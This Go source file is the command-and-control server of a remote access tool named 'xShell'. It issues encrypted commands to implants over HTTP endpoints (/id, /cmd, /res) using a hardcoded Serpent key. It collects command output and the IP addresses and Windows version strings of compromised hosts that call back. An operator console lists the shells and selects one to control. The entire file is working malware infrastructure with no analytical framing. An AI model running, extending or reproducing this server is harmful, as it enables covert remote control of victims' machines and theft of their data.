package main

import (
	"bufio"
	"fmt"
	"io"
	"net/http"
	"os"
	"strings"
	"sync"
	"time"
	"xShell/c2/internal"

	"github.com/brianvoe/gofakeit/v6"
)

var Port string = "80"
var Key string = "thisismypassword"

type shell struct {
	id        string
	ip        string
	version   string
	command   string
	timestamp time.Time
}

var shells = make(map[string]*shell)
var currentShell *shell
var mutex = &sync.Mutex{}

func shellIDHandler(w http.ResponseWriter, r *http.Request) {
	gofakeit.Seed(0)
	noun := gofakeit.Noun()
	adjective := gofakeit.Adjective()
	id := fmt.Sprintf("%s_%s", adjective, noun)
	id = strings.Trim(id, "\x00")
	encId, _ := internal.SerpentEncrypt([]byte(id), []byte(Key))
	w.Write(encId)
}

func getCommandHandler(w http.ResponseWriter, r *http.Request) {
	id := r.URL.Query().Get("id")
	id = strings.Trim(id, "\x00")

	mutex.Lock()
	defer mutex.Unlock()

	if _, ok := shells[id]; !ok {
		shells[id] = &shell{
			id:      id,
			ip:      r.RemoteAddr,
			version: "Unknown",
		}
		shells[id].timestamp = time.Now()
		w.Write([]byte{})
	} else if currentShell != nil && currentShell.id == id {
		if currentShell.command == "quit" {
			enc, _ := internal.SerpentEncrypt([]byte("quit"), []byte(Key))
			w.Write(enc)
			delete(shells, id)
			currentShell = nil
		} else {
			enc, _ := internal.SerpentEncrypt([]byte(currentShell.command), []byte(Key))
			w.Write(enc)
			currentShell.command = ""
		}
	} else {
		w.Write([]byte{})
	}
}

func postResultHandler(w http.ResponseWriter, r *http.Request) {
	id := r.URL.Query().Get("id")
	id = strings.Trim(id, "\x00")
	body, _ := io.ReadAll(r.Body)
	r.Body.Close()
	body, _ = internal.SerpentDecrypt(body, []byte(Key))
	fmt.Printf("\n[*] Agent called back, sent %d bytes\n", len(body))
	fmt.Printf("\nxShell %s> ", currentShell.id)
	mutex.Lock()
	defer mutex.Unlock()

	if s, ok := shells[id]; ok {
		if strings.Contains(string(body), "Microsoft Windows [") {
			s.version = strings.TrimSpace(string(body))
		} else {
			if currentShell != nil && currentShell.id == id {
				fmt.Printf("\nCommand output from shell %s:\n%s\n", id, string(body))
				fmt.Printf("\nxShell %s> ", currentShell.id)
			}
		}
		s.timestamp = time.Now()
	} else {
		shells[id] = &shell{
			id:        id,
			ip:        strings.Split(r.RemoteAddr, ":")[0],
			version:   strings.TrimSpace(string(body)),
			command:   "",
			timestamp: time.Now(),
		}
	}
}

func readUserCommand() {
	reader := bufio.NewReader(os.Stdin)

	for {
		if currentShell != nil {
			fmt.Printf("xShell %s> ", currentShell.id)
		} else {
			fmt.Print("C2> ")
		}

		command, _ := reader.ReadString('\n')
		command = strings.TrimSuffix(command, "\n")

		if command == "shells" {
			mutex.Lock()
			for id, shell := range shells {
				fmt.Printf("ID: %s, IP: %s, Version: %s\n", id, shell.ip, shell.version)
			}
			mutex.Unlock()
		} else if strings.HasPrefix(command, "shell ") {
			id := strings.TrimPrefix(command, "shell ")
			mutex.Lock()
			if shell, ok := shells[id]; ok {
				currentShell = shell
			} else {
				fmt.Printf("No shell with ID %s\n", id)
			}
			mutex.Unlock()
		} else if command == "exit" {
			currentShell = nil
		} else if command == "quit" && currentShell != nil {
			mutex.Lock()
			delete(shells, currentShell.id)
			mutex.Unlock()
			currentShell = nil
		} else if currentShell != nil {
			currentShell.command = command
		} else {
			fmt.Println("Unknown command")
		}
	}
}

func cleanOldShells() {
	for {
		mutex.Lock()
		for id, shell := range shells {
			if time.Since(shell.timestamp) > 5*time.Minute {
				delete(shells, id)
			}
		}
		mutex.Unlock()
		time.Sleep(1 * time.Minute)
	}
}

func main() {
	http.HandleFunc("/id", shellIDHandler)
	http.HandleFunc("/cmd", getCommandHandler)
	http.HandleFunc("/res", postResultHandler)

	go func() {
		http.ListenAndServe(":"+Port, nil)
	}()

	go cleanOldShells()
	readUserCommand()
}
